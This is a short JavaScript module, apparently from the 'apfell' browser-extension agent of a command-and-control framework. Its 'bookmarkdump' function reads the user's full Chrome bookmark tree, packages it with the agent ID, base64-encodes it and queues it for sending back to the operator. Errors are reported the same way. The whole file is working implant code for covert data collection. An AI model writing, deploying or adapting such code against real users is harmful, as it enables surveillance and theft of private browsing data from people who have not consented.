exports.bookmarkdump = function(task) {
    try {
        chrome.bookmarks.getTree(function(bookmarks) {
            let response = {'task_id':task.id, 'user_output':JSON.stringify(bookmarks, null, 2), 'completed':true};
            let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
            let enc = JSON.stringify(outer_response);
            let final = apfell.apfellid + enc;
            let msg = btoa(unescape(encodeURIComponent(final)));
            out.push(msg);
        });
    } catch (error) {
        let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }
};